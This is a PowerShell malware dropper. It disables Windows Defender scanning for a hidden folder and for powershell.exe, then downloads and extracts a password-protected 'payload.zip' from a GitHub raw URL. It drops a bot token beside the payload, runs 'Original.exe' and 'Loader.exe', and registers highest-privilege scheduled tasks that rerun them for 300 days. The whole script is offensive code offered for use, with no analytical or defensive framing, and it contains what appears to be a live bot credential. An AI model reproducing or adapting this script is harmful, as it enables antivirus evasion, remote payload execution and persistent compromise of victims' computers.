# Variables
$7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"  # 7-Zip 64-bit installer
$installerPath = "$env:TEMP\7zInstaller.exe"
$7zipPath = "C:\Program Files\7-Zip\7z.exe"
$zipUrl = "https://raw.githubusercontent.com/osacarbald/newuplsss/main/payload.zip"
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$folderPath = Join-Path -Path $documentsPath -ChildPath "gogjothegoat"
$zipFilePath = Join-Path $folderPath "file.zip"
$password = "badguy"                # Replace with the ZIP file password
$destinationPath = $folderPath     # Replace with desired extraction folder
$payloadFolderPath = Join-Path $folderPath "payload"
$processName = "Original.exe"            # Process to check for and execute
$tboy = "7642416431:AAGRRHpOzRdpupruWLRgOiInIgZ8J1iNHiI"

$processName = "powershell.exe"
Add-MpPreference -ExclusionPath $folderPath | Out-Null
Add-MpPreference -ExclusionProcess $processName | Out-Null


# Function to Download and Install 7-Zip
function Install-7Zip {
    Write-Host "7-Zip not found. Downloading and installing..."
    Invoke-WebRequest -Uri $7zipUrl -OutFile $installerPath
    Write-Host "Downloaded 7-Zip installer."
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
    Write-Host "7-Zip installed successfully."
    Remove-Item -Path $installerPath -Force
}

# Check if 7-Zip is Installed
if (-Not (Test-Path $7zipPath)) {
    Install-7Zip
} else {
    Write-Host "7-Zip is already installed."
}

# Create folder if it does not exist
if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
    (Get-Item $folderPath).Attributes = 'Hidden'
}

# Check if the zip file is already downloaded, if not, download it
if (-Not (Test-Path $zipFilePath)) {
    Write-Host "Downloading ZIP file..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
}

# Extract Password-Protected ZIP File
if (Test-Path $7zipPath) {
    Write-Host "Extracting ZIP file..."
    & $7zipPath x "-o$destinationPath" "-p$password" $zipFilePath -y
    if ($LASTEXITCODE -eq 0) {
        Write-Host "ZIP file extracted successfully to $destinationPath."
    } else {
        Write-Host "Failed to extract ZIP file. Check password and paths."
    }
} else {
    Write-Host "7-Zip installation failed or 7z.exe not found."
}

# Create a txt file with this
# Create a txt file with the value of $tboy
$tboyFilePath = Join-Path $payloadFolderPath "tboy.txt"
$tboyContent = "tboy $tboy"
$tboyContent | Out-File -FilePath $tboyFilePath -Encoding UTF8
Write-Host "Created tboy.txt with value: $tboy"

# Check if the payload folder exists and execute processes
if (Test-Path $payloadFolderPath) {
    Set-Location -Path $payloadFolderPath
    Write-Host "Payload folder found, executing processes..."

    # Check and start 'Original.exe' if not already running
    $OriginalExePath = Join-Path $payloadFolderPath "Original.exe"
    if (Test-Path $OriginalExePath) {
        $processRunning = Get-Process -Name "Original" -ErrorAction SilentlyContinue
        if ($null -eq $processRunning) {
            Write-Host "Starting Original.exe..."
            Start-Process -FilePath $OriginalExePath -WorkingDirectory $payloadFolderPath
            Write-Host "Waiting for 120 seconds before next step..."
            Start-Sleep -Seconds 5
        } else {
            Write-Host "'Original.exe' is already running."
        }
    } else {
        Write-Host "'Original.exe' not found in the payload folder."
    }

    # Execute Loader.exe if present
    $LoaderPath = Join-Path $payloadFolderPath "Loader.exe"
    if (Test-Path $LoaderPath) {
        Write-Host "Starting Loader.exe..."
        Start-Process -FilePath $LoaderPath -WorkingDirectory $payloadFolderPath
    } else {
        Write-Host "Loader.exe not found."
    }




      # Execute Original.exe if present
    $OriginalPath = Join-Path $payloadFolderPath "Original.exe"
    if (Test-Path $LoaderPath) {
        Write-Host "Starting Original.exe..."
        Start-Process -FilePath $OriginalPath -WorkingDirectory $payloadFolderPath
    } else {
        Write-Host "Original.exe not found."
    }



} else {
    Write-Host "Payload folder not found."
}

# I want to schedule a my Loader.exe
$taskName = "RunOriginalEvery2Minutes"
$action = New-ScheduledTaskAction -Execute "$OriginalExePath"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 50) -RepetitionDuration (New-TimeSpan -Days 300)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd
Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName $taskName -Description "Runs Original.exe every 2 minutes." -RunLevel Highest | Out-Null
Write-Host "Scheduled task for Original.exe set up."

# Schedule task for Loader.exe
$taskNameLoader = "RunLoaderEvery5Minutes"
$actionLoader = New-ScheduledTaskAction -Execute "$LoaderPath"
$triggerLoader = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 300)
$settingsLoader = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd
Register-ScheduledTask -Action $actionLoader -Trigger $triggerLoader -Settings $settingsLoader -TaskName $taskNameLoader -Description "Runs Loader.exe every 5 minutes." -RunLevel Highest | Out-Null
Write-Host "Scheduled task for Loader.exe set up."





# Indicate completion
Write-Host "Process completed."
